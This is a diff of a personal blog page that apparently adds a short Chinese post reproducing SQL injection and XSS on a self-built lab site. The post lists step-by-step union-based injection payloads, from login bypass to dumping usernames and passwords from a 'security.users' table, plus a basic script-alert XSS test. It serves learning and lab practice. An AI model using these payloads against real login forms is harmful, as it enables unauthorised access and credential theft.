@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-  <head>
+<head>
     <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
@@ -33,8 +33,8 @@
 
 
 
-  </head>
-  <body>
+</head>
+<body>
     <div id="fh5co-offcanvas">
     <a href="#!" class="fh5co-close-offcanvas js-fh5co-close-offcanvas">
         <span><i class="icon-cross3"></i> <span>Close</span></span>
@@ -147,61 +147,144 @@
 </header>
 
 
-    <div class="container-fluid">
-      <div class="row fh5co-post-entry">
+    <!--  <a href="#" class="fh5co-post-prev"><span>👈 Prev</span></a>-->
+    <!--  <a href="#" class="fh5co-post-next"><span>Next 👉</span></a>-->
 
-        
-            <article class="col-lg-3 col-md-3 col-sm-3 col-xs-12 col-xxs-12 animate-box" style="height: 25em;">
-            <figure class="img-box">
-              <a href="https://z0ekball.github.io/post/sql-zhu-ru-ji-chu-zhi-shi/">
+    <!-- 等gridea出自定义页面功能再优化一下 -->
+    
+        <div class="container-fluid">
+    <div class="row fh5co-post-entry single-entry">
+        <article class="col-lg-8 col-lg-offset-2 col-md-8 col-md-offset-2 col-sm-8 col-sm-offset-2 col-xs-12 col-xs-offset-0">
+            <figure class="animate-box">
                 
-                  <img data-original="https://z0ekball.github.io/post-images/sql-zhu-ru-ji-chu-zhi-shi.webp" alt="sqli-labs学习1~20" class="img-responsive img-rounded lazy">
+                    <img src="https://z0ekball.github.io/post-images/jian-dan-fu-xian-sqlxss-lou-dong.png" alt="简单复现SQL、XSS漏洞" class="img-responsive">
                 
-              </a>
             </figure>
-            <span class="fh5co-meta">
-              
-                    
-                        <a href="https://z0ekball.github.io/tag/Xnf6eEgg-/" class="tag">sql注入, </a>
-                    
-              
-            </span>
-            <h3 class="fh5co-article-title">
-              <a href="https://z0ekball.github.io/post/sql-zhu-ru-ji-chu-zhi-shi/">sqli-labs学习1~20</a>
-            </h3>
-            <span class="fh5co-meta fh5co-date">2021-06-05</span>
-          </article>
-        
-            <article class="col-lg-3 col-md-3 col-sm-3 col-xs-12 col-xxs-12 animate-box" style="height: 25em;">
-            <figure class="img-box">
-              <a href="https://z0ekball.github.io/post/ti-quan/">
+            <span class="fh5co-meta animate-box">
                 
-                  <img data-original="https://z0ekball.github.io/post-images/ti-quan.png" alt="提权学习" class="img-responsive img-rounded lazy">
-                
-              </a>
-            </figure>
-            <span class="fh5co-meta">
-              
             </span>
-            <h3 class="fh5co-article-title">
-              <a href="https://z0ekball.github.io/post/ti-quan/">提权学习</a>
-            </h3>
-            <span class="fh5co-meta fh5co-date">2021-06-01</span>
-          </article>
-        
-        <div class="clearfix visible-lg-block visible-md-block visible-sm-block visible-xs-block"></div>
+            <h2 class="fh5co-article-title animate-box">简单复现SQL、XSS漏洞</h2>
+            <ol class="breadcrumb fh5co-meta fh5co-date animate-box" style="margin-bottom:0; background-color:#f8f9fa">
+                <li>2022-09-15</li>
+                <li>229字</li>
+                <li>2 min read</li>
+            </ol>
 
-      </div>
+            <div class="col-lg-12 col-lg-offset-0 col-md-12 col-md-offset-0 col-sm-12 col-sm-offset-0 col-xs-12 col-xs-offset-0 text-left content-article">
+                <div class="row">
+                    <div class="col-md-12 animate-box post-content">
+                        <p> <h2 id="sql注入">SQL注入</h2>
+<h4 id="环境">环境：</h4>
+<pre><code>Apache  2.4.39
+MySQL  5.0.96
+PHP  5.5.9
+</code></pre>
+<h4 id="代码">代码：</h4>
+<p>Connect.php用于连接已有的数据库<br>
+<img src="https://z0ekball.github.io/post-images/image-20220415001328673.png" alt="" loading="lazy"></p>
+<p>简陋的sql漏洞网站就搭成了<br>
+<img src="https://z0ekball.github.io/post-images/image-20220415001341568.png" alt="" loading="lazy"></p>
+<p>抓包进行post传参，检测是否存在漏洞</p>
+<h4 id="验证">验证</h4>
+<p>username= 1' or 1&gt;0#&amp;password=1，成功登入，说明存在注入漏洞<br>
+<img src="https://z0ekball.github.io/post-images/image-20220415001353343.png" alt="" loading="lazy"></p>
+<p>username=Dumb'order by 3#&amp;password=Dumb，三个注入点<br>
+<img src="https://z0ekball.github.io/post-images/image-20220415001400244.png" alt="" loading="lazy"></p>
+<p>username=1' union select 1,2,3#&amp;password=1，回显点为2,3<br>
+<img src="https://z0ekball.github.io/post-images/image-20220415001406880.png" alt="" loading="lazy"></p>
+<p>username=1' union select 1,2,database()#&amp;password=1，查库<br>
+<img src="https://z0ekball.github.io/post-images/image-20220415001411085.png" alt="" loading="lazy"></p>
+<p>username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()limit 0,1#&amp;password=1，查表<br>
+<img src="https://z0ekball.github.io/post-images/image-20220415001414528.png" alt="" loading="lazy"></p>
+<p>username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'limit 0,1#&amp;password=1，查列<br>
+<img src="https://z0ekball.github.io/post-images/image-20220415001417936.png" alt="" loading="lazy"></p>
+<p>username=1' union select 1,2,group_concat(concat_ws('-',username,password)) from security.users#&amp;password=1，查字段<br>
+<img src="https://z0ekball.github.io/post-images/image-20220415001421336.png" alt="" loading="lazy"></p>
+<h2 id="xss漏洞">XSS漏洞</h2>
+<h4 id="环境-2">环境：</h4>
+<pre><code>Apache  2.4.39
+MySQL  5.0.96
+PHP  5.5.9
+</code></pre>
+<h4 id="代码-2">代码：</h4>
+<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415001606551.png" alt="" loading="lazy"></figure>
+<p>简陋的xss漏洞网站搭成了<br>
+<img src="https://z0ekball.github.io/post-images/image-20220415001702624.png" alt="" loading="lazy"></p>
+<h4 id="验证-2">验证</h4>
+<p>输入xss<br>
+<img src="https://z0ekball.github.io/post-images/image-20220415001753617.png" alt="" loading="lazy"></p>
+<p>输入<script>alert('xss')</script>，存在xss漏洞<br>
+<img src="https://z0ekball.github.io/post-images/image-20220415001801617.png" alt="" loading="lazy"></p>
+ </p>
+                    </div>
+                </div>
 
-      <div class="pagination-box animate-box">
+                <div class="row">
+                    <div class="col-md-12 animate-box">
+                        
+                            <div class="next-post">
+                                <div class="next">下一篇</div>
+                                <a href="https://z0ekball.github.io/post/qiu-ji-sai-wp/">
+                                    <h3 class="post-title">
+                                        秋季赛WP
+                                    </h3>
+                                </a>
+                            </div>
+                        
+                    </div>
+                </div>
+
+                <div class="row">
+    <div class="col-md-12 animate-box">
         
-          <a href="https://z0ekball.github.io/" class="prev">
-            <i class="fa fa-chevron-left"></i> 上一页
-          </a>
-        
-        
-      </div>
     </div>
+</div>
+
+            </div>
+
+        </article>
+    </div>
+</div>
+
+    
+
+    <!-- 返回顶部 -->
+    <div class="back-to-top">
+    
+        <a href="#!" id="tool-toc" class="hidden-xs hidden-sm">
+            <i class="fa fa-map"></i>
+        </a>
+        <br>
+    
+    <a href="#top" class="hidden-xs hidden-sm"><i class="fa fa-paper-plane"></i></a>
+</div>
+
+<div class="post-toc animated fadeInRight hidden-xs hidden-sm" style="display: none;">
+    <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#sql%E6%B3%A8%E5%85%A5">SQL注入</a><br>
+*
+<ul>
+<li><a href="#%E7%8E%AF%E5%A2%83">环境：</a></li>
+<li><a href="#%E4%BB%A3%E7%A0%81">代码：</a></li>
+<li><a href="#%E9%AA%8C%E8%AF%81">验证</a></li>
+</ul>
+</li>
+<li><a href="#xss%E6%BC%8F%E6%B4%9E">XSS漏洞</a><br>
+*
+<ul>
+<li><a href="#%E7%8E%AF%E5%A2%83-2">环境：</a></li>
+<li><a href="#%E4%BB%A3%E7%A0%81-2">代码：</a></li>
+<li><a href="#%E9%AA%8C%E8%AF%81-2">验证</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+</div>
+
 
     
 <footer id="fh5co-footer">
@@ -262,5 +345,5 @@
 
 
 
-  </body>
+</body>
 </html>
